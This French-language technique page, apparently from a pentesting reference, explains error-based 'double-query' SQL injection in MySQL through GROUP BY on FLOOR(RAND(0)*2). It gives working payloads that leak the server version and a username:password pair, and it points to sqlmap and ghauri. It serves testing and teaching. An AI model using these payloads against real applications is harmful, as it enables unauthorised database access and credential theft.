---
title: "Injection error-based double-query FLOOR dans MySQL"
description: "Faire fuiter des données MySQL via une erreur de clé dupliquée forcée par GROUP BY sur FLOOR(RAND(0)*2), le canal d'erreur qui précède les fonctions XPath."
keywords:
  - injection double-query
  - FLOOR RAND
  - erreur GROUP BY
  - duplicate entry
  - injection error-based
---

# FLOOR double-query

Avant que les fonctions XPath n'existent, les fuites error-based utilisaient une erreur de clé dupliquée issue d'un `GROUP BY` sur `FLOOR(RAND(0)*2)`. C'est le repli sur les serveurs plus anciens que la 5.1.5 et là où `EXTRACTVALUE`/`UPDATEXML` sont filtrés, et il n'a pas de troncature à 32 caractères.

Le payload groupe les lignes par une valeur qui concatène les données cibles avec `FLOOR(RAND(0)*2)`. Le `RAND(0)` à graine fixe est déterministe, et son interaction avec `GROUP BY` fait que la clé groupée est calculée deux fois pour un même groupe, ce qui insère une clé dupliquée dans la table temporaire et lève une erreur contenant la valeur concaténée :

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- 
```

La réponse porte `Duplicate entry '8.0.36:1' for key '<group_key>'`, faisant fuiter le résultat de la sous-requête avant les deux-points. Remplacez le `SELECT` interne par n'importe quelle requête à valeur unique :

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- 
```

L'agrégat a besoin de plusieurs lignes pour déclencher la collision de façon fiable, donc `information_schema.tables` (ou `information_schema.columns`) est utilisé comme source de lignes car il en a toujours assez. Gardez la sous-requête qui fuit à une seule ligne, comme avec les canaux XPath.

## Outils

- **sqlmap** : extraction error-based automatisée incluant la technique double-query FLOOR/RAND.
- **ghauri** : alternative rapide avec forte évasion des WAF.

## Références

- MySQL Reference Manual: GROUP BY, aggregate functions, RAND
- OWASP Testing Guide: Testing for SQL Injection
